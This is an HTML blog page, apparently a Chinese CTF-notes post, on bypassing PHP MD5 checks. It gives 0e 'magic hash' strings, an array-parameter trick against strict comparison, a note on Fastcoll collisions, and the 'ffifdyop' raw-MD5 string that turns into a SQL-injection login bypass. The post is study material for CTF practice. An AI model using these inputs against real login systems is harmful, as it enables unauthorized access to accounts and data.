@@ -1,0 +1,191 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>常见的MD5绕过漏洞 | Tokens</title><meta name="keywords" content="CTF notes"><meta name="author" content="Tokens"><meta name="copyright" content="Tokens"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="常见的MD5绕过漏洞弱类型比较if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) &#x3D;&#x3D; $_GET[&quot;password&quot;])  0e215962017的md5值也为0e开头 if (md5($str1) &#x3D;&#x3D; md5($str2))  构造出md5值为0e开头的字符串，弱类型比较会认为是科学计数法 md5的值均为0e开头">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见的MD5绕过漏洞">
+<meta property="og:url" content="http://example.com/2021/09/08/md5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:site_name" content="Tokens">
+<meta property="og:description" content="常见的MD5绕过漏洞弱类型比较if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) &#x3D;&#x3D; $_GET[&quot;password&quot;])  0e215962017的md5值也为0e开头 if (md5($str1) &#x3D;&#x3D; md5($str2))  构造出md5值为0e开头的字符串，弱类型比较会认为是科学计数法 md5的值均为0e开头">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg">
+<meta property="article:published_time" content="2021-09-08T15:50:25.172Z">
+<meta property="article:modified_time" content="2021-09-08T15:54:06.949Z">
+<meta property="article:author" content="Tokens">
+<meta property="article:tag" content="CTF notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg"><link rel="shortcut icon" href="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727210046.png"><link rel="canonical" href="http://example.com/2021/09/08/md5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%94%B6%E9%9B%86/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: Tokens","link":"Link: ","source":"Source: Tokens","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '常见的MD5绕过漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-09-08 23:54:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tokens</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">常见的MD5绕过漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-08T15:50:25.172Z" title="Created 2021-09-08 23:50:25">2021-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-09-08T15:54:06.949Z" title="Updated 2021-09-08 23:54:06">2021-09-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">328</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>1min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="常见的MD5绕过漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="常见的MD5绕过漏洞"><a href="#常见的MD5绕过漏洞" class="headerlink" title="常见的MD5绕过漏洞"></a>常见的MD5绕过漏洞</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (hash(<span class="string">&quot;md5&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>]) == <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p><code>0e215962017</code>的md5值也为0e开头</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$str1</span>) == md5(<span class="variable">$str2</span>))</span><br></pre></td></tr></table></figure>
+
+<p>构造出md5值为0e开头的字符串，弱类型比较会认为是科学计数法</p>
+<p>md5的值均为0e开头</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">0e215962017</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (md5(md5(<span class="variable">$str1</span>)) == md5(<span class="variable">$str2</span>))</span><br></pre></td></tr></table></figure>
+
+<p>md5和双md5后两个均为0e开头</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
+
+<h2 id="强类型比较"><a href="#强类型比较" class="headerlink" title="强类型比较"></a>强类型比较</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$str1</span>)===md5(<span class="variable">$str2</span>))</span><br></pre></td></tr></table></figure>
+
+<p>利用md5函数无法处理数组的特点，可以传参</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?str1[]=1&amp;str2[]=2</span><br></pre></td></tr></table></figure>
+
+<p>两个传参的返回值都是false，两个相等，得以绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$str1</span>) === md5(<span class="variable">$str2</span>))</span><br></pre></td></tr></table></figure>
+
+<p>进行了强制类型转换，则无法使用数组绕过了</p>
+<p>需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了</p>
+<h2 id="绕过md5-来构造攻击语句"><a href="#绕过md5-来构造攻击语句" class="headerlink" title="绕过md5()来构造攻击语句"></a>绕过md5()来构造攻击语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password = md5($pass,true)</span><br></pre></td></tr></table></figure>
+
+<p>一个绝妙的字符串:</p>
+<p><strong>ffifdyop</strong></p>
+<p>这个字符串加密之后：276f722736c95d99e921722cf9ed621c</p>
+<p>再转换为字符串得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;66�]��!r,��b</span><br></pre></td></tr></table></figure>
+
+<p>代入之后相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password = &#x27;&#x27;or&#x27;66�]��!r,��b&#x27;</span><br><span class="line">#万能密码出现了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password = &#x27;&#x27;or 1</span><br><span class="line">#实现sql注入</span><br></pre></td></tr></table></figure>
+
+<p>再给一个一样道理的字符串</p>
+<p><strong>129581926211651571912466741651878684928</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from admin where password=&#x27;&#x27;or ture</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tokens</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/09/08/md5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%94%B6%E9%9B%86/">http://example.com/2021/09/08/md5的常用收集/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-notes/">CTF notes</a></div><div class="post_share"><div class="social-share" data-image="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/09/02/XSS-LABS/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727215401.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">XSS-LABS</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/07/27/学习日记/" title="学习日记"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727215307.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-27</div><div class="title">学习日记</div></div></a></div><div><a href="/2021/08/02/绕过disable_function/" title="绕过disable_functions"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727200224.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-02</div><div class="title">绕过disable_functions</div></div></a></div><div><a href="/2021/08/05/HTTP请求走私/" title="HTTP请求走私"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727200140.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-05</div><div class="title">HTTP请求走私</div></div></a></div><div><a href="/2021/09/02/XSS-LABS/" title="XSS-LABS"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727215401.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-02</div><div class="title">XSS-LABS</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tokens</div><div class="author-info__description">一个web新人，想打CTF</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tokens77"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Tokens77" target="_blank" title=""><i class="fab fa-github"></i></a><a class="social-icon" href="https://user.qzone.qq.com/1473179869" target="_blank" title=""><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">请你喝杯蜂蜜云普茶</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84MD5%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">常见的MD5绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.1.</span> <span class="toc-text">弱类型比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.</span> <span class="toc-text">强类型比较</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87md5-%E6%9D%A5%E6%9E%84%E9%80%A0%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">绕过md5()来构造攻击语句</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/08/md5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%94%B6%E9%9B%86/" title="常见的MD5绕过漏洞"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见的MD5绕过漏洞"/></a><div class="content"><a class="title" href="/2021/09/08/md5%E7%9A%84%E5%B8%B8%E7%94%A8%E6%94%B6%E9%9B%86/" title="常见的MD5绕过漏洞">常见的MD5绕过漏洞</a><time datetime="2021-09-08T15:50:25.172Z" title="Created 2021-09-08 23:50:25">2021-09-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/02/XSS-LABS/" title="XSS-LABS"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727215401.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS-LABS"/></a><div class="content"><a class="title" href="/2021/09/02/XSS-LABS/" title="XSS-LABS">XSS-LABS</a><time datetime="2021-09-02T02:43:40.996Z" title="Created 2021-09-02 10:43:40">2021-09-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="HTTP请求走私"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727200140.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTTP请求走私"/></a><div class="content"><a class="title" href="/2021/08/05/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="HTTP请求走私">HTTP请求走私</a><time datetime="2021-08-05T04:41:56.035Z" title="Created 2021-08-05 12:41:56">2021-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/02/%E7%BB%95%E8%BF%87disable_function/" title="绕过disable_functions"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727200224.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="绕过disable_functions"/></a><div class="content"><a class="title" href="/2021/08/02/%E7%BB%95%E8%BF%87disable_function/" title="绕过disable_functions">绕过disable_functions</a><time datetime="2021-08-02T03:12:02.578Z" title="Created 2021-08-02 11:12:02">2021-08-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/27/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/" title="学习日记"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727215307.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="学习日记"/></a><div class="content"><a class="title" href="/2021/07/27/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/" title="学习日记">学习日记</a><time datetime="2021-07-27T14:49:27.908Z" title="Created 2021-07-27 22:49:27">2021-07-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://forpicgogo.oss-cn-beijing.aliyuncs.com/img/20210727195447.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Tokens</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to contact me and be my friend!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
